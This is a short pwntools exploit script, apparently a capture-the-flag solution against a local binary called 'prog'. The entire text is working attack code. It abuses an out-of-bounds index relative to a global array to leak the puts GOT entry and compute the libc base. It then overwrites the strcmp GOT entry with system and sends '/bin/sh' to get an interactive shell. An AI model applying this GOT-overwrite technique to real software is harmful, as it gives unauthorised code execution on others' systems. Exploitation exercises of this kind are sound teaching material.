from pwn import *

ref = 'puts'

context.binary = 'prog'
e = context.binary

n1 = (e.got[ref] - e.sym.ans) // context.bytes + 4
n2 = (e.got.strcmp - e.sym.ans) // context.bytes + 4

l = e.libc
p = e.process()
p.clean()

p.sendline(str(n1).encode('ascii'))
addr = int(p.readline())
l.address += addr - l.sym[ref]

p.sendline(str(n2).encode('ascii'))
p.sendline(str(l.sym.system).encode('ascii'))

p.sendline(b'/bin/sh\x00')

p.interactive()
